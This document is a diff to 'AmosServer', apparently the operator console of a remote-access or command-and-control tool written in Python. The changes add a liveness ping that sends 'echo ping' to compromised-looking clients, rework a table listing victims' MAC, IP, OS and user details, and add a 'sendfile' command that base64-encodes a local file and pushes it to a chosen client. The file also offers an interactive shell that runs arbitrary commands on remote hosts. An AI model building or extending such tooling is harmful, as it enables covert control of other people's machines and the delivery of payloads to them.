@@ -1,4 +1,6 @@
+import os
 import time
+import base64
 import threading
 from termcolor import colored
 from http.server import ThreadingHTTPServer
@@ -7,8 +9,8 @@ from server_settings import (
     SERVER_IP, SERVER_PORT, ES_HANDLER,
     CONNECTED_CLIENTS, client_lock,
     command_queue, response_storage, response_lock,
-    get_next_cmd_id, COMMAND_RESPONSE_TIMEOUT, CLIENT_ALIVE_TIMEOUT
-)
+    get_next_cmd_id, COMMAND_RESPONSE_TIMEOUT,
+    CLIENT_ALIVE_TIMEOUT)
 
 
 art = """
@@ -41,6 +43,21 @@ class AmosServer:
         return colored(text, "cyan", attrs=["bold"])
 
 
+    def ping_client(self, client_id, timeout=25):
+        """Send a lightweight command and wait for a response to verify the client is alive."""
+        cmd_id = get_next_cmd_id()
+        command_queue.put((client_id, "echo ping", cmd_id))
+
+        start = time.time()
+        while time.time() - start < timeout:
+            with response_lock:
+                if cmd_id in response_storage:
+                    response_storage.pop(cmd_id)  # clean up
+                    return True
+            time.sleep(0.2)
+        return False
+
+
     # Main Interactive shell
     def shell_interface(self):
         print("[*] Amos Shell started. Type 'guide' for commands.\n")
@@ -60,46 +77,50 @@ class AmosServer:
                 elif base_cmd == "clients":
                     ES_HANDLER.retrieve_client_information()
 
+
                 elif base_cmd == "connected":
-                    now = time.time()
-                    stale_keys = []
+                    print("[*] Checking for live clients...")
+                    alive_clients = []
+                    dead_keys = []
                     with client_lock:
-                        # Remove stale clients
-                        for cid, info in CONNECTED_CLIENTS.items():
-                            if now - info['last_seen'] > CLIENT_ALIVE_TIMEOUT:
-                                stale_keys.append(cid)
-                        for cid in stale_keys:
-                            del CONNECTED_CLIENTS[cid]
-                        # Build a list of client data with last_seen
-                        connected_list = []
-                        for cid, info in CONNECTED_CLIENTS.items():
-                            # Get the full client document from ES
-                            client_data = ES_HANDLER.get_client_data(cid)
-                            if client_data:
-                                client_data['_source']['last_seen'] = time.ctime(info['last_seen'])
-                                connected_list.append(client_data)
-                    if connected_list:
+                        clients_to_check = list(CONNECTED_CLIENTS.items())
+
+                    for cid, info in clients_to_check:
+                        if self.ping_client(cid, timeout=10):
+                            alive_clients.append((cid, info))
+                        else:
+                            dead_keys.append(cid)
+
+                    # Remove dead clients from registry
+                    with client_lock:
+                        for cid in dead_keys:
+                            CONNECTED_CLIENTS.pop(cid, None)
+                    if alive_clients:
                         ES_HANDLER.pt.field_names = ["Client ID", "Mac Address", "IP", "System", "Node Name",
                                                      "Release", "Version", "Machine", "Date-Joined",
                                                      "Time-Joined", "User", "Last Seen"]
-                        for hit in connected_list:
-                            src = hit['_source']
-                            ES_HANDLER.pt.add_row([
-                                hit['_id'],
-                                src.get("mac-address"),
-                                src.get("ip"),
-                                src.get("os"),
-                                src.get("system-name"),
-                                src.get("release"),
-                                src.get("version"),
-                                src.get("machine"),
-                                src.get("date-joined"),
-                                src.get("time-joined"),
-                                src.get("user"),
-                                src.get("last_seen")
-                            ])
+
+                        for cid, info in alive_clients:
+                            client_data = ES_HANDLER.get_client_data(cid)
+                            if client_data:
+                                src = client_data['_source']
+                                ES_HANDLER.pt.add_row([
+                                    cid,
+                                    src.get("mac-address"),
+                                    src.get("ip"),
+                                    src.get("os"),
+                                    src.get("system-name"),
+                                    src.get("release"),
+                                    src.get("version"),
+                                    src.get("machine"),
+                                    src.get("date-joined"),
+                                    src.get("time-joined"),
+                                    src.get("user"),
+                                    time.ctime(info['last_seen'])
+                                ])
                         print(ES_HANDLER.pt)
                         ES_HANDLER.pt.clear()
+
                     else:
                         print("[-] No connected clients.")
 
@@ -108,7 +129,7 @@ class AmosServer:
                         print("[+] Usage: shell <client_id>")
                         continue
                     client_id = parts[1]
-                    # Check if client exists in CONNECTED_CLIENTS (optional)
+
                     with client_lock:
                         if client_id not in CONNECTED_CLIENTS:
                             print(f"[-] Client '{client_id}' not connected.")
@@ -197,6 +218,31 @@ class AmosServer:
                     self.show_commands()
                     continue
 
+                elif cmd.startswith("sendfile "):
+                    local_path = cmd.split(maxsplit=1)[1]
+                    if not os.path.isfile(local_path):
+                        print(f"[-] File not found: {local_path}")
+                        continue
+                    try:
+                        with open(local_path, 'rb') as f:
+                            b64_data = base64.b64encode(f.read()).decode()
+                        filename = os.path.basename(local_path)
+                        cmd_id = get_next_cmd_id()
+                        command_queue.put((client_id, f"sendfile {filename} {b64_data}", cmd_id))
+                        print(f"[*] Sending {filename} (ID: {cmd_id})...")
+                        start = time.time()
+                        while time.time() - start < COMMAND_RESPONSE_TIMEOUT:
+                            with response_lock:
+                                if cmd_id in response_storage:
+                                    print(f"[+] {response_storage.pop(cmd_id)}")
+                                    break
+                            time.sleep(0.2)
+                        else:
+                            print("[-] Timeout waiting for confirmation.")
+                    except Exception as e:
+                        print(f"[-] Sendfile error: {e}")
+                    continue
+
                 # Generate command ID
                 cmd_id = get_next_cmd_id()
                 # Queue the command
@@ -220,6 +266,7 @@ class AmosServer:
 
                 else:
                     print(f"[-] Timeout waiting for response (ID: {cmd_id}).")
+
 
             except KeyboardInterrupt:
                 print("\n[+] Exiting interactive shell.")
@@ -252,6 +299,3 @@ if __name__ == "__main__":
     server.start_background_server()
     server.shell_interface()
     print("[+] Amos server terminated.")
-
-
-
